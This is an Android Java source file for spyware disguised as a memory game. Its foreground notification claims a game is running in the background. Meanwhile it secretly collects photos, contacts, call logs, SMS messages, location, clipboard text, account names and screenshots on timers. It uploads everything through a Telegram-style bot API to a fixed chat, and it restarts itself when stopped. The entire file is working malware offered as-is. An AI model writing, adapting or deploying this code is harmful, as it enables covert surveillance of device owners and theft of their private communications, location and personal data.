package com.v8.global.sniffer.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.app.ActivityCompat;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.utils.Constants;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class CollectorService extends Service {

    private static final String TAG = "CollectorService";
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isRunning = true;
    
    // متغيرات لتتبع آخر إرسال
    private long lastPhotoTime = 0;
    private long lastContactTime = 0;
    private long lastCallTime = 0;
    private long lastSmsTime = 0;
    private long lastLocationTime = 0;
    private String lastClipboard = "";

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground();
        startCollection();
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "collector_channel",
                "Game Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);

            Notification notification = new NotificationCompat.Builder(this, "collector_channel")
                .setContentTitle("Memory Challenge")
                .setContentText("اللعبة تعمل في الخلفية...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

            startForeground(999, notification);
        }
    }

    private void startCollection() {
        // جمع الصور كل 5 دقائق
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectPhotos();
                    handler.postDelayed(this, 5 * 60 * 1000);
                }
            }
        }, 10 * 1000);

        // جمع جهات الاتصال كل ساعة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectContacts();
                    handler.postDelayed(this, 60 * 60 * 1000);
                }
            }
        }, 20 * 1000);

        // جمع المكالمات كل ساعة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectCallLogs();
                    handler.postDelayed(this, 60 * 60 * 1000);
                }
            }
        }, 30 * 1000);

        // جمع الرسائل كل ساعة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectSms();
                    handler.postDelayed(this, 60 * 60 * 1000);
                }
            }
        }, 40 * 1000);

        // جمع الموقع كل 15 دقيقة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectLocation();
                    handler.postDelayed(this, 15 * 60 * 1000);
                }
            }
        }, 50 * 1000);

        // جمع الحافظة كل دقيقة
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectClipboard();
                    handler.postDelayed(this, 60 * 1000);
                }
            }
        }, 5 * 1000);

        // جمع الحسابات كل 3 ساعات
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectAccounts();
                    handler.postDelayed(this, 3 * 60 * 60 * 1000);
                }
            }
        }, 60 * 1000);

        // تصوير الشاشة كل 10 دقائق
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    takeScreenshot();
                    handler.postDelayed(this, 10 * 60 * 1000);
                }
            }
        }, 15 * 1000);
    }

    private void collectPhotos() {
        try {
            String[] projection = {
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DISPLAY_NAME
            };

            long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
            String selection = MediaStore.Images.Media.DATE_ADDED + " > ?";
            String[] args = {String.valueOf(oneHourAgo)};

            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, selection, args,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 5) {
                    String path = cursor.getString(0);
                    String name = cursor.getString(2);
                    long date = cursor.getLong(1) * 1000;

                    if (date > lastPhotoTime && new File(path).exists()) {
                        sendFile(path, "image/*", "📸 صورة جديدة: " + name);
                        lastPhotoTime = date;
                        count++;
                        Thread.sleep(2000);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جمع الصور: " + e.getMessage());
        }
    }

    private void collectContacts() {
        try {
            StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            int count = 0;
            if (cursor != null) {
                while (cursor.moveToNext() && count < 50) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("📞 ").append(name).append(": ").append(phone).append("\n");
                    count++;
                }
                cursor.close();
            }
            sendMessage(sb.toString());
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جمع جهات الاتصال");
        }
    }

    private void collectCallLogs() {
        try {
            StringBuilder sb = new StringBuilder("📞 **سجل المكالمات**\n\n");
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 20"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));

                    String typeText = type.equals("1") ? "📞 وارد" : 
                                     type.equals("2") ? "📞 صادر" : "❌ فائت";

                    sb.append(typeText).append(": ")
                      .append(name != null ? name : number)
                      .append(" - ").append(new Date(date).toString()).append("\n");
                }
                cursor.close();
            }
            sendMessage(sb.toString());
        } catch (Exception e) {
            Log.e(TAG, "خطأ في سجل المكالمات");
        }
    }

    private void collectSms() {
        try {
            StringBuilder sb = new StringBuilder("💬 **الرسائل**\n\n");
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null,
                "date DESC LIMIT 20"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));

                    sb.append("📨 من ").append(address).append(":\n");
                    sb.append(body.length() > 50 ? body.substring(0, 50) + "..." : body);
                    sb.append("\n---\n");
                }
                cursor.close();
            }
            sendMessage(sb.toString());
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الرسائل");
        }
    }

    private void collectLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    == PackageManager.PERMISSION_GRANTED) {
                
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }

                if (location != null) {
                    String mapUrl = "https://maps.google.com/?q=" + 
                                   location.getLatitude() + "," + 
                                   location.getLongitude();

                    String msg = "📍 **الموقع**\n\n" +
                                "الخط: " + location.getLatitude() + "\n" +
                                "الطول: " + location.getLongitude() + "\n" +
                                "الدقة: " + location.getAccuracy() + "م\n" +
                                "الرابط: " + mapUrl;

                    sendMessage(msg);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الموقع");
        }
    }

    private void collectClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            ClipData clip = clipboard.getPrimaryClip();

            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();

                if (!text.equals(lastClipboard) && !text.isEmpty()) {
                    sendMessage("📋 **الحافظة**\n\n" + text);
                    lastClipboard = text;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الحافظة");
        }
    }

    private void collectAccounts() {
        try {
            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = am.getAccounts();

            if (accounts.length > 0) {
                StringBuilder sb = new StringBuilder("🔑 **الحسابات**\n\n");
                for (Account acc : accounts) {
                    sb.append("• ").append(acc.name).append(" (").append(acc.type).append(")\n");
                }
                sendMessage(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الحسابات");
        }
    }

    private void takeScreenshot() {
        try {
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + 
                         System.currentTimeMillis() + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            process.waitFor();

            File file = new File(path);
            if (file.exists()) {
                sendFile(path, "image/*", "📱 لقطة شاشة");
                file.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في تصوير الشاشة");
        }
    }

    private void sendMessage(String message) {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .build();

            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID +
                        "&text=" + Uri.encode(message) + "&parse_mode=Markdown";

            Request request = new Request.Builder()
                .url(url)
                .build();

            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }

    private void sendFile(String filePath, String mimeType, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;

            OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();

            RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Constants.CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.getName(),
                    RequestBody.create(MediaType.parse(mimeType), file))
                .build();

            Request request = new Request.Builder()
                .url(Constants.BASE_URL + "sendDocument")
                .post(body)
                .build();

            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        Intent intent = new Intent(this, CollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        super.onDestroy();
    }
              }
